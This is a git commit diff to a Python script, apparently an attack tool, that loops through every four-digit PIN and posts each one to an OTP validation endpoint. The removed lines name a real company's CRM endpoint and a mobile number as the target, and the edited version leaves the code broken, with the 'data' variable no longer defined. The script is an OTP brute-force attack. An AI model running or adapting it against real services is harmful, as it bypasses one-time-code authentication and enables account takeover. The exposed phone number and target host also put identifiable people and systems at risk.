e6110e33063ec156742d35e4e9cce1a7a3a0bc6f
Monst3rSec <60444051+Monst3rSec@users.noreply.github.com>
2020-04-09 21:35:44 +0530

    Update OTP-sync.py

--- OTP-sync.py
+++ OTP-sync.py
@@ -6,10 +6,8 @@ from aiohttp import ClientSession
 def OTP():
     #return requests.get("http://httpbin.org/get")
     for i in range(1000,9999):
-        data={'pin':None,'mob_no':8110093393}
-        data['pin']=i
         print(data)
-        r=requests.post("https://qacfrcrm.tafe.com/index.php?entryPoint=validateOTP",data=data)
+        r=requests.post("TARGET_URL",data=data)
         print(r.text)
 
 OTP()
